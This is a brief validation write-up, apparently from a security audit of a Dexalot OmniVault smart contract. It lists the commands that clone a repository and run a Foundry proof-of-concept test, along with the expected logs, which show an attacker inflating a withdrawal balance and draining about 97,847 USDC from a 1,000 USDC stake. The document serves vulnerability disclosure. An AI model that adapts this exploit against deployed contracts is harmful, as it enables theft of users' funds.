# STEAL-02 — Validation Steps

## Environment

```
Forge 1.5.1-stable
Solc 0.8.30
OS: Kali Linux
```

## Steps

1. Clone the repo and install dependencies:

```bash
git clone https://github.com/caizongxun/dexalot-omnivault-audit.git
cd dexalot-omnivault-audit
forge install foundry-rs/forge-std
```

2. Run the PoC:

```bash
forge test --match-test testSTEAL02_InflatedWithdrawalBalanceDrainsVault -vvv
```

## Expected Output

```
[PASS] testSTEAL02_InflatedWithdrawalBalanceDrainsVault()
Logs:
  [+] Attacker shares: 1978 (x1e-15) out of totalSupply: 2021
  [EXPLOIT] SETTLER finalized with FAKE vault balance: 100,000,000 USDC
  [EXPLOIT] Attacker invested:  1,000 USDC
  [EXPLOIT] Attacker received: 97847 USDC (~97.8x ROI)
  [EXPLOIT] STEAL-02 CONFIRMED
```

## Proof

The assertion `assertGt(stolen, 50_000e6)` passes, confirming the attacker received
over 50x their invested amount.
